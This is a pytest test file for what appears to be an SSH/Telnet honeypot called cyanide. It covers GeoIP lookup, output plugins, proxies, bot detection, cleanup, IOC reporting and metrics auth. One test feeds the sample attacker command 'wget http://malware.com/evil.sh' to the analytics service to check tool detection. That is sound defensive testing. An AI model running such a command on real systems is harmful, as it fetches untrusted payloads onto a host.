import sys
from unittest.mock import MagicMock

if "hpfeeds" not in sys.modules:
    sys.modules["hpfeeds"] = MagicMock()

import asyncio
import importlib
import os
import time
from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

from cyanide.core.cleanup import CleanupManager
from cyanide.core.geoip import GeoIP
from cyanide.core.paths import get_default_config_path, get_profiles_dir
from cyanide.core.server import CyanideServer, SSHSession
from cyanide.core.stats import StatsManager
from cyanide.core.telemetry import setup_telemetry
from cyanide.core.vm_pool import SimplePool, VMPool
from cyanide.core.vt_scanner import VTScanner
from cyanide.network.ssh_proxy import (
    CyanideSSHServer,
    ProxyClientChannel,
    ProxyServerSession,
)
from cyanide.network.tcp_proxy import TCPProxy
from cyanide.output.base import OutputPlugin
from cyanide.output.hpfeeds import Plugin as HPFeedsPlugin
from cyanide.output.syslog import Plugin as SyslogPlugin
from cyanide.services.analytics import AnalyticsService
from cyanide.services.ioc_reporter import IOCReporter
from cyanide.services.telnet_handler import TelnetHandler
from cyanide.vfs.engine import FakeFilesystem
from cyanide.vfs.nodes import Directory, File


class MockResponse:
    def __init__(self, status, json_data=None, bytes_data=None):
        self.status = status
        self._json = json_data
        self._bytes = bytes_data

    async def json(self):
        return self._json

    async def read(self):
        return self._bytes

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        pass


class MockSession:
    def __init__(self, resp):
        self.resp = resp
        self.closed = False

    def get(self, *args, **kwargs):
        return self.resp

    async def close(self):
        self.closed = True

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        pass


@pytest.fixture
def mock_config():
    return {
        "cleanup": {
            "enabled": True,
            "interval": 1,
            "retention_days": 1,
            "paths": ["/tmp/test_cleanup"],
        },
        "package_managers": ["all"],
    }


@pytest.fixture
def fs():
    mock_fs = MagicMock()
    mock_fs.mkfile = MagicMock()
    mock_fs.is_dir = MagicMock(return_value=False)
    root = Directory("root", None)
    test_file = File("test_file", root)
    root.children["test_file"] = test_file
    mock_fs.get_node = MagicMock(return_value=test_file)
    mock_fs.resolve_node = MagicMock(return_value=test_file)
    mock_fs.os_profile = "debian"
    mock_fs.exists = MagicMock(return_value=True)
    mock_fs.get_content = MagicMock(return_value="test content")
    return mock_fs


@pytest.fixture
def emulator(fs, mock_config):
    emu = MagicMock()
    emu.fs = fs
    emu.username = "root"
    emu.cwd = "/root"
    emu.resolve_path = lambda p: f"/root/{p}" if not p.startswith("/") else p
    emu.pending_input_callback = None
    emu.logger = MagicMock()
    emu.width = 80
    emu.height = 24
    emu.config = mock_config
    emu.session_id = "test_sess"
    return emu


# ==================== ANALYTICS & GEOIP TESTS ====================


@pytest.mark.asyncio
async def test_analytics_tool_detection():
    service = AnalyticsService({"ml": {"enabled": False}}, MagicMock())
    service.analyze_command("wget http://malware.com/evil.sh", "1.1.1.1", "sess1")
    assert any("tool_detection" in str(call) for call in service.logger.log_event.call_args_list)


@pytest.mark.asyncio
async def test_geoip_boost():
    geoip = GeoIP()
    res = await geoip.lookup("127.0.0.1")
    assert res["country"] == "Local Network"

    mock_resp = MockResponse(
        200,
        json_data={
            "status": "success",
            "country": "MockCountry",
            "city": "MockCity",
            "isp": "MockISP",
            "lat": 1.0,
            "lon": 2.0,
        },
    )

    with patch("aiohttp.ClientSession", return_value=MockSession(mock_resp)):
        res = await geoip.lookup("8.8.8.8")
        assert res["country"] == "MockCountry"
        assert res["city"] == "MockCity"


@pytest.mark.asyncio
async def test_geoip_ptr_boost():
    geoip = GeoIP()
    with patch("asyncio.get_event_loop") as mock_get_loop:
        mock_loop = MagicMock()
        mock_loop.getnameinfo = AsyncMock(return_value=("dns.google", 0))
        mock_get_loop.return_value = mock_loop

        ptr = await geoip.lookup_ptr("8.8.8.8")
        assert ptr == "dns.google"

        mock_loop.getnameinfo.side_effect = Exception()
        ptr = await geoip.lookup_ptr("8.8.8.8")
        assert ptr is None


# ==================== OUTPUT PLUGINS TESTS ====================


def test_hpfeeds_output():
    config = {
        "host": "localhost",
        "port": 10000,
        "ident": "id",
        "secret": "sec",
        "channels": ["chan1"],
        "enabled": True,
    }
    with patch("hpfeeds.new") as mock_new:
        mock_client = MagicMock()
        mock_new.return_value = mock_client

        output = HPFeedsPlugin(config)
        output.write({"event": "test"})
        mock_client.publish.assert_called()


def test_hpfeeds_output_no_ident():
    config = {"enabled": True}
    output = HPFeedsPlugin(config)
    output.write({"event": "test"})
    assert output.client is None


def test_syslog_output():
    config = {"address": "/dev/log", "facility": "user", "enabled": True}
    with patch("logging.handlers.SysLogHandler"):
        with patch("socket.socket"):
            output = SyslogPlugin(config)
            output.write({"event": "test"})
            assert output.logger is not None


def test_all_output_plugins_instantiation():
    output_dir = "src/cyanide/output"
    plugin_files = [
        f[:-3]
        for f in os.listdir(output_dir)
        if f.endswith(".py") and f != "__init__.py" and f != "base.py"
    ]

    for plugin_name in plugin_files:
        modules_to_mock = {
            "psycopg": MagicMock(),
            "psycopg2": MagicMock(),
            "mysql": MagicMock(),
            "mysql.connector": MagicMock(),
            "pymongo": MagicMock(),
            "elasticsearch": MagicMock(),
            "rethinkdb": MagicMock(),
            "hpfeeds": MagicMock(),
            "requests": MagicMock(),
        }

        with patch.dict("sys.modules", modules_to_mock):
            try:
                module_path = f"cyanide.output.{plugin_name}"
                module = importlib.import_module(module_path)
                PluginClass = getattr(module, "Plugin")

                config = {
                    "enabled": True,
                    "host": "127.0.0.1",
                    "port": 1234,
                    "ident": "test_id",
                    "secret": "test_secret",
                    "url": "http://test",
                    "token": "test",
                    "path": "/tmp/test.sqlite",
                    "uri": "mongodb://test",
                    "listen_port": 25,
                    "target_host": "127.0.0.1",
                    "target_port": 2525,
                }

                if plugin_name in ("splunk_hec", "slack", "dshield"):
                    mock_requests = modules_to_mock["requests"]
                    mock_response = MagicMock()
                    mock_response.status_code = 200
                    mock_requests.post.return_value = mock_response

                plugin = PluginClass(config)
                assert isinstance(plugin, OutputPlugin)
                plugin.write({"test": "data"})

                if hasattr(plugin, "conn") and plugin.conn:
                    try:
                        plugin.conn.close()
                    except Exception:
                        pass
            except Exception as e:
                print(f"Skipping plugin {plugin_name} due to: {e}")


# ==================== PROXIES & TELEMETRY & STATS ====================


def test_proxy_basic_coverage():
    proxy = TCPProxy("127.0.0.1", 0, "127.0.0.1", 22)
    assert proxy.listen_host == "127.0.0.1"

    ssh_p = CyanideSSHServer(None, "127.0.0.1", 22, MagicMock())
    assert ssh_p.target_host == "127.0.0.1"


def test_stats_manager_coverage():
    mgr = StatsManager()
    mgr.get_stats()
    mgr.on_connect("ssh", "1.1.1.1")
    mgr.on_auth("u", "p", True)
    mgr.on_command("ssh", "1.1.1.1", "u", "ls")
    mgr.on_traffic("in", 100)
    assert mgr.total_sessions == 1


@pytest.mark.asyncio
async def test_stats_manager_prometheus_boost():
    stats = StatsManager()
    stats.on_connect("ssh", "1.2.3.4")
    stats.on_auth("root", "admin", False)
    output = stats.to_prometheus()
    assert "cyanide_active_sessions 1" in output
    assert "cyanide_auth_failures_total 1" in output


def test_telemetry_coverage():
    tel = setup_telemetry("test", {"enabled": False})
    span = tel.start_span("test")
    assert span is not None


def test_vt_scanner_init():
    scanner = VTScanner("test_api_key")
    assert scanner.api_key == "test_api_key"


def test_paths_coverage():
    with patch("pathlib.Path.exists", return_value=False):
        path = get_default_config_path()
        assert "app.yaml" in str(path)

    with patch("pathlib.Path.is_dir", return_value=False):
        path = get_profiles_dir()
        assert "profiles" in str(path)


# ==================== VM POOL & CLEANUP & IOC REPORTER ====================


def test_vm_pool_basic():
    config = {"ml": {"pool_size": 2}, "ssh": {"backend_mode": "pool"}}
    VMPool(config)


@pytest.mark.asyncio
async def test_vm_pool_boost():
    config = {"pool": {"enabled": True, "targets": "127.0.0.1:22,192.168.1.100:22"}}
    pool = SimplePool(config)
    assert len(pool.targets) == 2
    assert ("127.0.0.1", 22) in pool.targets


def test_cleanup_manager_full(mock_config):
    manager = CleanupManager(mock_config)
    with patch("pathlib.Path.exists", return_value=True):
        with patch("pathlib.Path.rglob", return_value=[Path("/tmp/old_file")]):
            with patch("pathlib.Path.is_file", return_value=True):
                with patch("pathlib.Path.stat") as mock_stat:
                    mock_stat.return_value.st_mtime = 0
                    mock_stat.return_value.st_size = 100
                    res = manager.cleanup_files(dry_run=True)
                    assert res["deleted"] == 1


@pytest.mark.asyncio
async def test_ioc_reporter_boost(tmp_path):
    log_dir = tmp_path / "logs"
    log_dir.mkdir()
    config = {"logging": {"directory": str(log_dir)}}
    logger = MagicMock()

    reporter = IOCReporter(config, logger)
    reporter.add_ioc("ip", "1.2.3.4", "Malicious IP", "session1")
    reporter.generate_reports(quiet=True)
    assert reporter.report_dir.exists()


# ==================== SSH PROXY & SESSIONS ====================


@pytest.mark.asyncio
async def test_ssh_proxy_boost():
    pool = MagicMock()
    pool.reserve_target = AsyncMock(return_value=("1.2.3.4", 22))
    chan = MagicMock()
    chan.get_extra_info.return_value = ("1.2.3.4", 12345)
    fs = MagicMock()

    with patch("cyanide.network.ssh_proxy.logger") as mock_logger:
        session = ProxyServerSession(pool, "1.2.3.4", 22, "session1", "1.2.3.4", fs)
        session.connection_made(chan)
        session.data_received(b"test data", 0)

        client_chan = ProxyClientChannel("session1", "1.2.3.4", chan)
        client_chan.data_received(b"response", 0)
        assert mock_logger.info.called


@pytest.mark.asyncio
async def test_ssh_proxy_error_paths():
    pool = MagicMock()
    pool.reserve_target = AsyncMock(return_value=("host", 22))
    proxy = ProxyServerSession(pool, "target", 22, "s1", "5.6.7.8", MagicMock())
    chan = MagicMock()
    proxy.connection_made(chan)

    with patch("asyncssh.connect", side_effect=Exception("fail")):
        await proxy._connect_backend()


@pytest.mark.asyncio
async def test_server_session_bot_detection_coverage(emulator):
    framework = MagicMock()
    framework.stats = MagicMock()
    session = SSHSession(framework, emulator.fs, "1.2.3.4", 12345, "s1")

    session.keystrokes = [1.0, 1.001, 1.002, 1.003]
    is_bot = session._calculate_is_bot(False, 10)
    assert is_bot is True

    session.keystrokes = [1.0, 1.2, 1.5, 1.9]
    is_bot = session._calculate_is_bot(False, 10)

    session._close_session = AsyncMock()
    res = session._handle_system_commands("exit")
    assert res is True


@pytest.mark.asyncio
async def test_ssh_session_in_editor_coverage(emulator):
    framework = MagicMock()
    framework.stats = MagicMock()
    session = SSHSession(framework, emulator.fs, "1.2.3.4", 12345, "s1")
    session.shell = emulator
    session.shell.pending_input_callback = AsyncMock(return_value=("", "", 0))
    session.shell.execute = AsyncMock(return_value=("resp", "", 0))
    session._write = MagicMock()
    session.process = None

    await session._process_input("\x1b[Atest")
    assert session._write.called


@pytest.mark.asyncio
async def test_ssh_session_extra_coverage():
    mock_framework = MagicMock()
    mock_framework.logger = MagicMock()
    mock_fs = MagicMock()

    session = SSHSession(mock_framework, mock_fs, "127.0.0.1", 12345, "123")
    session.session_id = "test_session"
    session.src_ip = "127.0.0.1"

    session.env_received(b"TERM", b"xterm")
    session.env_received("LANG", "en_US.UTF-8")
    session.terminal_size_changed(80, 24, 0, 0)

    session.shell_requested()
    session.exec_requested("ls -la")
    session.subsystem_requested("sftp")

    session.start_time = time.time() - 10
    session.keystrokes = [time.time() - 5, time.time() - 4, time.time() - 2]
    session.username = "root"
    session.commands = ["ls", "id"]
    session.bytes_in = 100
    session.bytes_out = 200
    session.client_version = "SSH-2.0-OpenSSH_8.2p1"

    session.connection_lost(Exception("test error"))
    session.connection_lost(None)

    mock_conn = MagicMock()
    mock_conn.get_extra_info.return_value = "mock_algo"
    session._log_ssh_details(mock_conn)


# ==================== VFS ENGINE & PROFILE LOADER ====================


@pytest.mark.asyncio
async def test_vfs_engine_render_boost():
    fs = FakeFilesystem(os_profile="debian")
    res = fs._render(b"test")
    assert res == b"test"

    res = fs._render("test")
    assert res == "test"

    fs.context = MagicMock()
    fs.context.to_dict.return_value = {"var": "val"}
    res = fs._render("{{ var }}")
    assert res == "val"


@pytest.mark.asyncio
async def test_vfs_engine_render_coverage(emulator):
    engine = FakeFilesystem(os_profile="debian")
    assert engine._render("") == ""
    assert engine._render(b"bytes") == b"bytes"
    assert engine._render("normal text") == "normal text"
    engine.context = MagicMock()
    engine.context.to_dict = MagicMock(return_value={"var": "val"})
    assert engine._render("{{ var }}") == "val"
    with patch.object(engine.jinja_env, "from_string", side_effect=Exception("fail")):
        assert engine._render("{{ fail }}") == "{{ fail }}"


@pytest.mark.asyncio
async def test_engine_extra_coverage():
    fs = FakeFilesystem(os_profile="debian")
    fs.move("/nonexistent", "/tmp/new")
    fs.mkfile("/tmp/a_file", b"data")
    fs.remove("/tmp/a_file")


def test_engine_history_edge_cases(fs):
    fs.src_ip = "unknown"
    fs.save_ip_history()

    fs.src_ip = "1.1.1.1"
    fs.memory_overlay["/root/.bash_history"] = {"content": ""}
    fs.save_ip_history()

    with patch("pathlib.Path.mkdir", side_effect=RuntimeError("mkdir failed")):
        fs.memory_overlay["/root/.bash_history"] = {"content": "ls\n"}
        fs.save_ip_history()


@pytest.mark.asyncio
async def test_profile_loader_edge_cases():
    from cyanide.vfs.profile_loader import load

    with patch("builtins.open", MagicMock(side_effect=Exception("YAML error"))):
        try:
            load("invalid", Path("/tmp"))
        except Exception:
            pass


# ==================== TELNET & METRICS TESTS ====================


@pytest.mark.asyncio
async def test_telnet_handler_structural_coverage():
    server = MagicMock()
    server.config = {"shell": {"motd": "test"}}
    server.logger = MagicMock()
    server.stats = MagicMock()
    server.services = MagicMock()
    config = {"session_timeout": 300}

    handler = TelnetHandler(server, config)
    reader = AsyncMock()
    writer = MagicMock()

    task = asyncio.create_task(handler.handle_connection(reader, writer))
    await asyncio.sleep(0.1)
    task.cancel()
    try:
        await task
    except (asyncio.CancelledError, Exception):
        pass


@pytest.mark.asyncio
async def test_telnet_read_char_edge_cases(emulator):
    class MockReader:
        def __init__(self, side_effect):
            self.side_effect = side_effect

        async def read(self, n):
            if not self.side_effect:
                return b""
            res = self.side_effect.pop(0)
            if isinstance(res, Exception):
                raise res
            return res

    handler = TelnetHandler(MagicMock(), {"telnet": {"timeout": 0.1}})

    reader = MockReader([asyncio.TimeoutError()])
    char = await handler._read_char(reader)
    assert char is None
    reader = MockReader([b""])
    char = await handler._read_char(reader)
    assert char is None

    reader = MockReader([b"\xff", b""])
    char = await handler._read_char(reader)
    assert char is None

    reader = MockReader([b"\xff", b"\xfa", b"\x01", b"", b""])
    char = await handler._read_char(reader)
    assert char is None


@pytest.mark.asyncio
async def test_metrics_auth_failure():
    config = {
        "metrics": {"enabled": True, "token": "secret_token", "port": 0},
    }
    server = CyanideServer(config)

    mock_reader = AsyncMock()
    mock_reader.readuntil.return_value = (
        b"GET /metrics HTTP/1.1\r\nAuthorization: Bearer wrong\r\n\r\n"
    )

    mock_writer = MagicMock()
    mock_writer.get_extra_info.return_value = ("127.0.0.1", 12345)
    mock_writer.drain = AsyncMock()
    mock_writer.wait_closed = AsyncMock()

    await server._handle_metrics_request(mock_reader, mock_writer)
    assert b"401 Unauthorized" in mock_writer.write.call_args[0][0]


@pytest.mark.asyncio
async def test_metrics_remote_config():
    config = {
        "metrics": {"enabled": True, "port": 0, "allow_remote": True},
    }
    server = CyanideServer(config)
    with patch("asyncio.start_server", new_callable=AsyncMock) as mock_start:
        await server.start_metrics_server()
        mock_start.assert_called()
        args, _ = mock_start.call_args
        assert args[1] == "0.0.0.0"


@pytest.mark.asyncio
async def test_metrics_handler_error():
    server = CyanideServer({"metrics": {"enabled": True}})
    mock_reader = AsyncMock()
    mock_reader.readuntil.side_effect = Exception("metrics read fail")

    mock_writer = MagicMock()
    mock_writer.get_extra_info.return_value = ("127.0.0.1", 12345)
    mock_writer.wait_closed = AsyncMock()

    with patch.object(server.logger, "log_event") as mock_log:
        await server._handle_metrics_request(mock_reader, mock_writer)
        assert any("metrics_handler_error" in str(call) for call in mock_log.call_args_list)


# ==================== KNOWLEDGE BASE (ML) ====================


def test_knowledge_base_more_edge_cases():
    from cyanide.ml.classifier import KnowledgeBase

    kb = KnowledgeBase()
    kb.is_built = True
    match = {
        "similarity": 0.2,
        "technique_id": "T1000",
        "technique_name": "Test",
        "source": "unknown",
    }
    with patch.object(kb, "search", return_value=[match]):
        with patch.object(kb, "_fallback_classify", return_value={"classified": True}):
            res = kb.classify_command("ls")
            assert res["classified"] is True


# ==================== ADDITIONAL BOOSTER TESTS ====================


@pytest.mark.asyncio
async def test_geoip_extra_booster():
    from cyanide.core.geoip import GeoIP

    geoip = GeoIP(cache_size=1)

    # 1. Close session when it is None
    await geoip.close()

    # 2. Close session when it is active
    mock_session = AsyncMock()
    mock_session.closed = False
    geoip._session = mock_session
    await geoip.close()
    mock_session.close.assert_called_once()

    # 3. Close session when it is already closed
    mock_session.reset_mock()
    mock_session.closed = True
    await geoip.close()
    mock_session.close.assert_not_called()

    # 4. _get_session with active session that gets closed (covers 19->21 branch)
    mock_closed_session = MagicMock()
    mock_closed_session.closed = True
    geoip._session = mock_closed_session
    with patch("aiohttp.ClientSession", return_value=MockSession(MockResponse(200))):
        sess = geoip._get_session()
        assert sess is not mock_closed_session

    # 4.5. _get_session with active session that is NOT closed (covers 19->21 branch - False direction)
    geoip._session = None
    with patch("aiohttp.ClientSession", return_value=MockSession(MockResponse(200))):
        sess1 = geoip._get_session()
        sess2 = geoip._get_session()
        assert sess1 is sess2

    # 5. lookup_ptr localhost
    ptr = await geoip.lookup_ptr("127.0.0.1")
    assert ptr == "localhost"

    # 6. lookup cache hit and cache size limit
    mock_resp_1 = MockResponse(200, json_data={"status": "success", "country": "US"})
    mock_resp_2 = MockResponse(200, json_data={"status": "success", "country": "FR"})

    # First lookup (fills cache because cache_size=1)
    geoip._session = None
    with patch("aiohttp.ClientSession", return_value=MockSession(mock_resp_1)):
        res1 = await geoip.lookup("8.8.8.8")
        assert res1["country"] == "US"

    # Second lookup for same IP (cache hit)
    res1_cached = await geoip.lookup("8.8.8.8")
    assert res1_cached["country"] == "US"

    # Third lookup for different IP (should not be cached because len(cache) >= cache_size)
    geoip._session = None
    with patch("aiohttp.ClientSession", return_value=MockSession(mock_resp_2)):
        res2 = await geoip.lookup("9.9.9.9")
        assert res2["country"] == "FR"

    # Verify 9.9.9.9 is not in cache
    assert "9.9.9.9" not in geoip.cache

    # 7. lookup with status not 200 (covers 58->75 branch)
    mock_resp_500 = MockResponse(500)
    geoip._session = None
    with patch("aiohttp.ClientSession", return_value=MockSession(mock_resp_500)):
        res_500 = await geoip.lookup("1.1.1.1")
        assert res_500 is None

    # 8. lookup with status 200 but failed status (covers 60->75 branch)
    mock_resp_fail_status = MockResponse(200, json_data={"status": "fail"})
    geoip._session = None
    with patch("aiohttp.ClientSession", return_value=MockSession(mock_resp_fail_status)):
        res_fail_status = await geoip.lookup("2.2.2.2")
        assert res_fail_status is None

    # 9. Exception in lookup
    with patch.object(geoip, "_get_session", side_effect=Exception("lookup fail")):
        res_fail = await geoip.lookup("8.8.4.4")
        assert res_fail is None


def test_cleanup_manager_extra_booster(mock_config):
    # 1. Disabled cleanup
    cfg = {"cleanup": {"enabled": False}}
    mgr = CleanupManager(cfg)
    assert mgr.cleanup_files() == {"status": "disabled"}

    # 2. Disabled cleanup with override
    with patch.object(mgr, "_cleanup_directory") as mock_clean:
        mgr.cleanup_files(retention_days_override=5)
        assert mock_clean.call_count == 2

    # 3. Directory not exists
    mgr = CleanupManager(mock_config)
    with patch("pathlib.Path.exists", return_value=False):
        mgr._cleanup_directory(Path("/nonexistent_dir_12345"), time.time(), dry_run=False, stats={})

    # 4. Non-files and errors in _process_file
    stats = {"deleted": 0, "bytes_freed": 0, "errors": 0}

    # We patch exists and rglob to return a non-file path
    mock_dir_path = MagicMock(spec=Path)
    mock_dir_path.is_file.return_value = False

    with patch("pathlib.Path.exists", return_value=True):
        with patch("pathlib.Path.rglob", return_value=[mock_dir_path]):
            mgr._cleanup_directory(Path("/dummy"), time.time(), dry_run=False, stats=stats)

    assert stats["deleted"] == 0
    assert stats["errors"] == 0

    # Try a mock file that raises Exception during stat
    mock_err_file = MagicMock(spec=Path)
    mock_err_file.stat.side_effect = Exception("stat error")

    # Test with logger
    mock_logger = MagicMock()
    mgr.logger = mock_logger
    stats = {"deleted": 0, "bytes_freed": 0, "errors": 0}
    mgr._process_file(mock_err_file, time.time(), dry_run=False, stats=stats)
    assert stats["errors"] == 1
    mock_logger.log_event.assert_called_once()

    # Test without logger
    mgr.logger = None
    stats = {"deleted": 0, "bytes_freed": 0, "errors": 0}
    mgr._process_file(mock_err_file, time.time(), dry_run=False, stats=stats)
    assert stats["errors"] == 1

    # Test dry_run=False (unlink)
    mock_ok_file = MagicMock(spec=Path)
    mock_ok_file.stat.return_value.st_mtime = 0
    mock_ok_file.stat.return_value.st_size = 50
    stats = {"deleted": 0, "bytes_freed": 0, "errors": 0}
    mgr._process_file(mock_ok_file, time.time(), dry_run=False, stats=stats)
    mock_ok_file.unlink.assert_called_once()
    assert stats["deleted"] == 1
    assert stats["bytes_freed"] == 50


@pytest.mark.asyncio
async def test_telegram_extra_booster(tmp_path):
    from cyanide.output.telegram import Plugin as TelegramPlugin

    config = {
        "token": "123:ABC",
        "chat_id": "9876",
        "log_dir": str(tmp_path),
    }
    plugin = TelegramPlugin(config)

    # 1. emit non-critical
    plugin.emit({"eventid": "INFO"})

    # 2. write critical with requests.post not ok
    mock_resp_fail = MagicMock()
    mock_resp_fail.ok = False
    mock_resp_fail.status_code = 400
    mock_resp_fail.text = "Bad Request"

    with patch("requests.post", return_value=mock_resp_fail) as mock_post:
        plugin.write({"eventid": "CRITICAL_ALERT", "path": "/test"})
        assert mock_post.called

    # 3. write critical with requests.post raising Exception
    with patch("requests.post", side_effect=Exception("network error")) as mock_post:
        plugin.write({"eventid": "CRITICAL_ALERT", "path": "/test"})
        assert mock_post.called

    # 4. process updates with non-matching chat id
    plugin._process_updates(
        [
            {
                "update_id": 1,
                "message": {
                    "text": "/report",
                    "chat": {"id": 1111},  # wrong chat id
                },
            }
        ]
    )

    # 5. process updates with matching chat id but not report command
    plugin._process_updates(
        [
            {
                "update_id": 2,
                "message": {
                    "text": "hello",
                    "chat": {"id": 9876},
                },
            }
        ]
    )

    # 6. _send_report_documents when no reports exist
    with patch.object(plugin, "_send_text") as mock_send_text:
        plugin._send_report_documents()
        mock_send_text.assert_called_once()

    # 7. _send_text raising Exception
    with patch("requests.post", side_effect=Exception("tg fail")):
        plugin._send_text("test")

    # 8. _send_report_documents when reports exist but OSError is raised on read
    rep_dir = tmp_path / "reports"
    rep_dir.mkdir()
    (rep_dir / "cyanide_iocs.stix.json").touch()

    with patch("builtins.open", side_effect=OSError("permission denied")):
        plugin._send_report_documents()

    # 9. _send_report_documents when reports exist but requests.post fails/raises Exception
    mock_tg_resp_fail = MagicMock()
    mock_tg_resp_fail.ok = False
    mock_tg_resp_fail.status_code = 400
    mock_tg_resp_fail.text = "Bad Request"
    with patch("requests.post", return_value=mock_tg_resp_fail):
        plugin._send_report_documents()

    with patch("requests.post", side_effect=Exception("tg post fail")):
        plugin._send_report_documents()

    # 10. _update_poll_loop getUpdates error and exception
    plugin.running = True

    # We want requests.get to return a non-ok response once, then we set plugin.running = False
    mock_resp_tg = MagicMock()
    mock_resp_tg.ok = False
    mock_resp_tg.status_code = 502

    def get_side_effect(*args, **kwargs):
        plugin.running = False
        return mock_resp_tg

    with patch("requests.get", side_effect=get_side_effect), patch("time.sleep"):
        plugin._update_poll_loop()

    # Test requests.get raising exception
    plugin.running = True

    def get_side_effect_exc(*args, **kwargs):
        plugin.running = False
        raise Exception("poll connection reset")

    with patch("requests.get", side_effect=get_side_effect_exc), patch("time.sleep"):
        plugin._update_poll_loop()


def test_splunk_hec_extra_booster():
    from cyanide.output.splunk_hec import Plugin as SplunkHecPlugin

    # 1. No token
    plugin = SplunkHecPlugin({"url": "http://splunk"})
    plugin.write({"event": "test"})

    plugin = SplunkHecPlugin({"url": "http://splunk", "token": "tok"})

    # 2. Event with timestamp
    mock_resp = MagicMock()
    mock_resp.status_code = 500
    mock_resp.text = "Internal Error"

    with patch("requests.post", return_value=mock_resp) as mock_post:
        plugin.write({"timestamp": "2026-06-22T21:13:54+00:00"})
        assert mock_post.called

    # 3. requests.post raises Exception
    with patch("requests.post", side_effect=Exception("splunk down")) as mock_post:
        plugin.write({"test": "data"})
        assert mock_post.called


def test_syslog_extra_booster():
    from cyanide.output.syslog import Plugin as SyslogPlugin

    # 1. address as tuple/list of length 2
    with patch("logging.handlers.SysLogHandler") as mock_handler:
        plugin = SyslogPlugin({"address": ("127.0.0.1", 514), "enabled": True})
        mock_handler.assert_called_once()

    # 2. invalid address format (neither str nor tuple/list of len 2)
    plugin = SyslogPlugin({"address": 12345, "enabled": True})
    assert plugin.logger.handlers == []

    # 3. Trigger PermissionError and Exception in SysLogHandler init
    with patch("logging.handlers.SysLogHandler", side_effect=PermissionError("denied")):
        with patch.object(SyslogPlugin, "_check_dev_log", return_value=True):
            plugin = SyslogPlugin({"address": "/dev/log", "enabled": True})
            assert not plugin.enabled

    with patch("logging.handlers.SysLogHandler", side_effect=Exception("generic error")):
        with patch.object(SyslogPlugin, "_check_dev_log", return_value=True):
            plugin = SyslogPlugin({"address": "/dev/log", "enabled": True})
            assert not plugin.enabled

    # 4. write when disabled
    plugin = SyslogPlugin({"address": "/dev/log", "enabled": False})
    plugin.write({"test": "data"})

    # 5. write triggering json serialization exception
    plugin = SyslogPlugin({"address": "/dev/log", "enabled": True})
    # mock handler to avoid socket binding
    with patch.object(plugin, "logger") as mock_logger:
        plugin.enabled = True
        plugin.write({"unserializable": {1, 2}})
        assert not mock_logger.info.called
